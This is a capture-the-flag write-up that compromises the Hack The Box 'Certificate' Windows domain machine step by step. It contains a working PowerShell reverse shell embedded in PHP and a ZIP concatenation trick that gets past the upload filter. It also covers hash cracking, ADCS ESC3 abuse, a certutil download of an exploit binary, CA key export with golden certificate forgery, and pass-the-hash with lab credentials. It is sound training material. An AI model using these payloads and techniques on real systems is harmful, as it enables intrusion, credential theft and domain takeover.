---
icon: windows
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Certificate Machine Walk-through

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

_Welcome! This write-up walks through the_ **Certificate** _machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

> #### **About Machine:**
>
> **Certificate** is a hard Windows Active Directory machine that starts with an E-learning platform. The web application is vulnerable to **Null-Byte Injection** in its file upload feature, allowing a **PHP** reverse shell to be executed for initial access as **xamppuser**. Database credentials are retrieved, enabling lateral movement to the **Sara.B** user. Further enumeration uncovers a network capture file that leaks **Lion.SK’s** credentials. Using these, Active Directory Certificate Services (**ADCS**) is enumerated, and a vulnerable template is exploited to request certificates on behalf of other users. A certificate for the **Ryan.K** user is then obtained, whose **SeManageVolumePrivilege** is leveraged to gain a shell as **NT AUTHORITY\NETWORK SERVICE**. Finally, **SeImpersonatePrivilege** is used to escalate to **NT AUTHORITY\SYSTEM**, dump **ntds.dit** and **registry** hives, and extract the Administrator’s **NTLM** hash, ultimately allowing access as the **Administrator**.

### Machine Information <a href="#id-3ab5" id="id-3ab5"></a>

* **Machine Name:** Certificate
* **Machine OS:** Windows
* **Difficulty:** Hard
* **Machine Link:** \[[https://app.hackthebox.com/machines/Certificate](https://app.hackthebox.com/machines/Certificate)]

> **Note:** In some of the next steps we may get a “Clock skew too great” error. Then run the following command to fix the problem: `sudo ntpdate <target>`
>
> Because Kerberos is very sensitive to time synchronization. If the clock difference between your machine and the target machine is more than 5 minutes, authentication fails. This is a security feature in Kerberos to prevent replay attacks.

### Initial Scan <a href="#id-50fa" id="id-50fa"></a>

```bash
nmap -p- -A -sC -vv --min-rate 10000 10.10.11.71 -oN scan.txt

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://certificate.htb/
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-10T20:46:32+00:00; +7h35m41s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49720/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/10%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=68989A5B%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=107%TI=I%II=I%SS=S%TS=U)
SEQ(SP=FC%GCD=1%ISR=10B%TI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=252 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h35m40s, deviation: 0s, median: 7h35m40s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50770/tcp): CLEAN (Timeout)
|   Check 2 (port 52899/tcp): CLEAN (Timeout)
|   Check 3 (port 43669/udp): CLEAN (Timeout)
|   Check 4 (port 58258/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-08-10T20:45:54
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   97.01 ms 10.10.14.1
2   97.06 ms 10.10.11.71
```

We found many open ports and also we found the DC name and domain name: `certificate.htb` and `DC01.certificate.htb`.

Let’s add the Domain `certificate.htb` and `DC01.certificate.htb` to `/etc/hosts` file.

```bash
sudo echo "10.10.11.71 certificate.htb DC01.certificate.htb" | sudo tee -a /etc/hosts
```

### Enumerate Web page: <a href="#id-2db8" id="id-2db8"></a>

Let’s explore the open port 80.

Exploring all the pages of the website and testing the **register/login** we see that their are many Courses are available. We select any one of them → Enroll The Course → Scroll down and see a option called submit the Quiz, and after clicking the Submit we eventually reach to the next interesting URL: \`[http://certificate.htb/upload.php?s\_id=ID\`](http://certificate.htb/upload.php?s_id=ID%60).

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

This page allow us to upload files and it’ll be reviewed by an instructor: “**Please select the assignment file you want to upload (the file will be reviewed by the course instructor)**”, it’s specially important because it tell us that our uploaded files will be manipulated by someone.

Normally, we have initial credentials for Windows machines but this time we haven’t, so this form looks like to be our initial entry to get them.

The file extension needs to be .pdf, .docx, .pptx, .xlsx or .zip so we need a way to bypass this check and maybe attempt to do an RCE.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

After many research we found this: \[Evasive ZIP Concatenation: Trojan Targets Windows Users | Perception Point]\([https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/](https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/))

Now we try to bypass the vulnerability.

### Exploitation: <a href="#e4c8" id="e4c8"></a>

1. Create a `page1.zip` with a regular PDF file:

```bash
zip page1.zip simple.pdf
```

2\. Now create reverse shell payload file:

```bash
mkdir exploit
cd exploit
vim exploit.php
```

And our payload is:

```bash
<?php
shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('YOURIP',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");
?>
```

3\. Now package the malicious payload:

```bash
zip -r exploit.zip Exploit
```

4\. Combine both “page1.zip” and “**exploit.zip**” into single archive called “**main.zip**”

```bash
cat page1.zip exploit.zip > main.zip
```

Now first we start our Netcat listener:

```bash
rlwrap -cAr nc -lnvp 4242
```

Now we try to upload our zip file. And after uploading file we will see “**HERE**” link to check our uploaded file.

And after clicking we see out simple pdf file with this URL: [`http://certificate.htb/static/uploads/6144021521507642c5a799e2bca164e3/simple.pdf`](http://certificate.htb/static/uploads/6144021521507642c5a799e2bca164e3/simple.pdf)

Now we try to access our reverse shell file, location: \``/Exploit/exploit.php`\`

And check in our listener we successfully get reverse shell connection.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

After many analysis we found `db.php` file from `C:\xampp\htdocs\certificate.htb\` and we found user and password:

```
DB_USERNAME: certificate_webapp_user
PASSWORD: cert!f!c@teDBPWD
```

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

Now we try to connect with MySQL but here is a problem with our shell. because interactive MYSQL has a bit of a problem in the rebound shell, it uses a non-interactive way to query.

So, we can try another process.

1. Move to mysql directory `C:\xampp\mysql\bin`:

```bash
cd C:\xampp\mysql\bin
```

2\. Run the following command to see database:

```bash
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "show databases;"
```

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

And we can see many database and one of the interesting database is **certificate\_webapp\_db**

3\. Now run the following command to see tables of **certificate\_webapp\_db** database:

```bash
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; show tables;"
```

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

And here we can see User table.

4\. Now run the following command to dump users table:

```bash
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;"  -E
```

In the user table, there are many users, here to pay attention to this `Sara.B` Because she exists in the user directory.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

So, we copy the password hash in our local machine.

Now try to crack the hash by using John.

```bash
john hash.txt - wordlist=/usr/share/wordlists/rockyou.txt
```

And we found `sara.b` Password: `Blink182`.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Now let’s try to connect with `Evil-WinRm`:

```bash
evil-winrm -i 10.10.11.71 -u Sara.B -p 'Blink182'
```

And We successfully get connection.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

After many research we don’t get user flag in this user, but we found a interesting PCAP file from `C:\Users\Sara.B\Documents\WS-01`.\
Let’s analysis this PCAP file using Wireshark.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

Opening it with Wireshark, after downloaded it, will reveal some auth packets (smb2, kerberos, ntlmssp) that we can use to attempt assembly them and crack the hashes.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

After many research we found a tool called \[Krb5RoastParser]\([https://github.com/jalvarezz13/Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser)) to extract the TGT hash from PCAP file.

Now Let’s try to extract the hash using Krb5RoastParser tool.

```bash
sudo git clone https://github.com/jalvarezz13/Krb5RoastParser
sudo chmod +x /opt/AD_Tools/Krb5RoastParser/krb5_roast_parser.py
python3 /opt/AD_Tools/Krb5RoastParser/krb5_roast_parser.py WS-01_PktMon.pcap as_req
```

And we successfully get TGT hash. Now save the hash in a file.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Now let’s try to crack the hash using hashcat.

```bash
hashcat kerberos_hash.txt -m 19900 /usr/share/wordlists/rockyou.txt
```

And we get Password:

```bash
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
```

Now connect with the credential:

```bash
Lion.SK:!QAZ2wsx
```

We successfully get connection and also get User Flag.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation: <a href="#id-004b" id="id-004b"></a>

Now for PrivEsc we need to enumerate the user. So, Now to try to collect Active Directory Data by using the `Lion.SK:!QAZ2wsx` Credentials:

```bash
bloodhound-python -u 'Lion.SK' -p '!QAZ2wsx' -d certificate.htb -ns 10.10.11.71 -c All - zip
```

> **Note:** Before Running the above command we need to add `WS-05.certificate.htb`, `WS-01.certificate.htb`, and `DC01.certificate.htb` to `/etc/hosts` file.

Looking into Bloodhound we may notice that `lion.sk` is member of the group “**DOMAIN CRA MANAGERS**” and by its description: “**The members of this security group are responsible for issuing and revoking multiple certificates for the domain users**”, we may think that we can attempt to manipulate certificates with `certipy-ad`.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

```bash
certipy-ad find -vulnerable -u 'Lion.SK@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -stdout
```

And we found this:

```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

Checking for vulnerable certificates we should found one with \[Active Directory Certificate Services ([ADCS — ESC3](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/)) vulnerability.

But if we attempt to exploit it to obtain the Administrator access it’ll fail so we need to continue exploring other options.

After some research we should find a new user: `ryan.k`, who is member of the group “**DOMAIN STORAGE MANAGERS**” and by the group description it can be interesting.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

If we try to exploit the ESC3 again but this time for `ryan.k` it should work and then we’ll be able to connect via `evil-winrm` with the user `ryan.k`.

1\. Run the following command to requests a certificate for the user `Lion.SK` from the CA `Certificate-LTD-CA` using the vulnerable template `Delegated-CRA`.

```bash
certipy-ad req -u 'Lion.SK@certificate.htb' -p '!QAZ2wsx' -dc-ip '10.10.11.71' -target 'DC01.certificate.htb' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
```

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

2\. Run the following command to perform certificate request delegation (ESC8 attack), allowing the user \`Lion.SK\` to request a certificate on behalf of `certificate\Ryan.K`.

```bash
certipy-ad req -u 'Lion.SK@certificate.htb' -p '!QAZ2wsx' -dc-ip '10.10.11.71' -target 'DC01.certificate.htb' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'certificate\Ryan.K'
```

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

3\. Run the following command to authenticate to Active Directory with a .pfx certificate (ryan.k.pfx).

```bash
certipy-ad auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
```

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

And we successfully get TGT Hash.

Now try to connect with Ryan.K using **Evil-winrm**:

```bash
evil-winrm -i 10.10.11.71 -u Ryan.K -H b1bc3d70e70f4f36b1509a65ae1a2ae6
```

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Now we have access to the system with the user `ryan.k` and checking his privileges we should see the “**SeManageVolume**” privilege and this can be exploited with: \[SeManageVolumeExploit]\([https://github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)).

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

This exploit grant us full permission on C:\ drive, then we attempt to access to the Administrator folder and see the content of root.txt.

Now we first download **SeManageVolumeExploit.exe** file from github and then transfer the file to Remote machine using `certutil`.

```bash
certutil -urlcache -f http://10.10.14.86/SeManageVolumeExploit.exe SeManageVolumeExploit.exe
```

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

It worked, now we have full access to the file system, our next goal is to extract the CA cert and CA private key, we got full access to the file system, which means we gain read/write access on areas that are normally blocked by the OS, if we are able to grab the CA cert and the key, we will be forging a certificate on behalf of administrator.

This is called a golden certificate attack, to retrieve more info on this attack, check this article: [https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc5/](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc5/)

### Golden Certificate Attack: <a href="#fc16" id="fc16"></a>

Again we use `certutil` in order to get the `pfx` to forge the golden cert and get admin hash.

First of all, let’s check the serial number for the certificate we need to export:

```bash
certutil -Store My
```

And we will see:

```bash
*Evil-WinRM* PS C:\Users\Ryan.K> certutil -Store My
My "Personal"
================ Certificate 0 ================
Archived!
Serial Number: 472cb6148184a9894f6d4d2587b1b165
Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:30 PM
 NotAfter: 11/3/2029 3:40 PM
Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
  Key Container = certificate-DC01-CA
  Provider = Microsoft Software Key Storage Provider
Missing stored keyset

================ Certificate 1 ================
Serial Number: 5800000002ca70ea4e42f218a6000000000002
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 8:14 PM
 NotAfter: 11/3/2025 8:14 PM
Subject: CN=DC01.certificate.htb
Certificate Template Name (Certificate Type): DomainController
Non-root Certificate
Template: DomainController, Domain Controller
Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft RSA SChannel Cryptographic Provider
Missing stored keyset

================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Provider = Microsoft Software Key Storage Provider
Missing stored keyset
CertUtil: -store command completed successfully.
```

We’re exporting Certificate 2 which is the CA. This certificate is passwordless and is self-signed which means this is the root CA of the domain, so we can perform a Golden Ticket attack.

Exporting the certificate:

```bash
certutil -exportPFX MY 75b2f4bbf31f108945147b466131bdca .\ca.pfx
```

And its work successfully.

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

Now With the .pfx in our hands we can proceed to forge our own certificate for the Administrator account and then finally achieve our final access.

First we download the `ca.pfx` file in our local machine:

```bash
download ca.pfx
```

Then Run the following command to create a forged certificate (Golden Certificate) for the domain user Administrator using the private key of the CA you already exported (ca.pfx).

```bash
certipy-ad forge -ca-pfx ca.pfx -out golden_ticket.pfx -upn Administrator
```

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

It successfully work.

Then Run the following command to authenticate to the domain controller (10.10.11.71) as the Administrator account in the `certificate.htb` domain, by supplying a PFX certificate (golden\_ticket.pfx) instead of a password or hash.

```bash
certipy-ad auth -pfx golden_ticket.pfx -dc-ip 10.10.11.71 -user Administrator -domain certificate.htb
```

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

And we get TGT hash:

Now Try to access Administrator account using the hash:

```bash
evil-winrm -i 10.10.11.71 -u Administrator -H d804304519bf0143c14cbf1c024408c6
```

And Boom, We get Administrator as well as root flag:

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

***

> _I hope you enjoyed this write-up! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

### Follow me on below Social Media: <a href="#eab9" id="eab9"></a>

1. _**LinkedIn:**_ [_Subhadip Sardar_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_@Mr\_SubhaDip03_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_SubhaDip003_](https://github.com/SubhaDip003)
